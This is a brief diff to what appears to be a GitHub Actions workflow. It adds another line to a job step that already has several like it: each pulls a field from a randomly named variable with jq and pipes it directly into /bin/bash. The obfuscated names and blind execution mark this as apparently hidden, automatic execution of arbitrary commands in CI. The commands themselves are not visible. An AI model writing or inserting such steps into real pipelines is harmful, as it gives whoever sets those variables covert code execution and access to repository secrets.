@@ -33,6 +33,7 @@ jobs:
           echo $bea2 | jq -r .sn02603 | /bin/bash
           echo $utppa79 | jq -r .cuce49620 | /bin/bash
           printf '%s' "$lp217" | jq -r .dkjl4990 | /bin/bash
+          printf '%s' "$dxma437" | jq -r .pbkm9687 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
